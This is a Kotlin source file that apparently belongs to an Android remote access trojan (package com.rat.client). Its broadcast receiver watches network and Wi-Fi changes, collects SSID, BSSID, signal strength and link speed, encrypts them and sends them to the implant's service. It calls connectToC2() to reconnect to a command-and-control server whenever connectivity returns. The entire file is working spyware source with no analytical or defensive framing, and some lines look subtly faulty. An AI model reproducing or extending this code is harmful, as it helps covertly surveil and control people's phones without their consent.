package com.rat.client.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.net.wifi.WifiManager
import android.util.Log
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.service.RatService
import com.rat.client.util.NetworkUtils

class ConnectivityReceiver : BroadcastReceiver() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "ConnectivityReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        when (action) {
            ConnectivityManager.CONNECTIVITY_ACTION -> {
                val networkInfo = intent.getParcelableExtra<NetworkInfo>(ConnectivityManager.EXTRA_NETWORK_INFO)
                handleNetworkChange(context, networkInfo)
            }
            WifiManager.WIFI_STATE_CHANGED_ACTION -> {
                val wifiState = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_UNKNOWN)
                handleWifiStateChange(context, wifiState)
            }
            WifiManager.NETWORK_STATE_CHANGED_ACTION -> {
                val networkInfo = intent.getParcelableExtra<NetworkInfo>(WifiManager.EXTRA_NETWORK_INFO)
                handleWifiNetworkChange(context, networkInfo)
            }
        }
    }

    private fun handleNetworkChange(context: Context, networkInfo: NetworkInfo?) {
        val service = RatService.getInstance()
        val isConnected = networkInfo?.isConnected == true

        val data = mapOf(
            "event" to "NETWORK_CHANGE",
            "connected" to isConnected,
            "type" to networkInfo?.typeName ?: "UNKNOWN",
            "subtype" to networkInfo?.subtypeName ?: "",
            "detailed_state" to networkInfo?.detailedState.name ?: "",
            "reason" to networkInfo?.reason ?: "",
            "extra_info" to networkInfo?.extraInfo ?: "",
            "timestamp" to System.currentTimeMillis()
        )

        service?.sendCommand("network_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))

        // Reconnect to C2 if we got connectivity
        if (isConnected) {
            service?.connectToC2()
        }
    }

    private fun handleWifiStateChange(context: Context, wifiState: Int) {
        val service = RatService.getInstance()
        val stateName = when (wifiState) {
            WifiManager.WIFI_STATE_ENABLED -> "ENABLED"
            WifiManager.WIFI_STATE_DISABLED -> "DISABLED"
            WifiManager.WIFI_STATE_ENABLING -> "ENABLING"
            WifiManager.WIFI_STATE_DISABLING -> "DISABLING"
            WifiManager.WIFI_STATE_UNKNOWN -> "UNKNOWN"
            else -> "UNKNOWN"
        }

        val data = mapOf(
            "event" to "WIFI_STATE_CHANGE",
            "state" to stateName,
            "timestamp" to System.currentTimeMillis()
        )

        service?.sendCommand("wifi_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
    }

    private fun handleWifiNetworkChange(context: Context, networkInfo: NetworkInfo?) {
        val service = RatService.getInstance()
        val isConnected = networkInfo?.isConnected == true

        val wifiInfo = NetworkUtils.getWifiInfo(context)

        val data = mapOf(
            "event" to "WIFI_NETWORK_CHANGE",
            "connected" to isConnected,
            "ssid" to wifiInfo["ssid"] ?: "",
            "bssid" to wifiInfo["bssid"] ?: "",
            "rssi" to wifiInfo["rssi"] ?: 0,
            "link_speed" to wifiInfo["link_speed"] ?: 0,
            "timestamp" to System.currentTimeMillis()
        )

        service?.sendCommand("wifi_event", EncryptionUtils.encrypt(com.google.gson.Gson().toJson(data)))
    }
}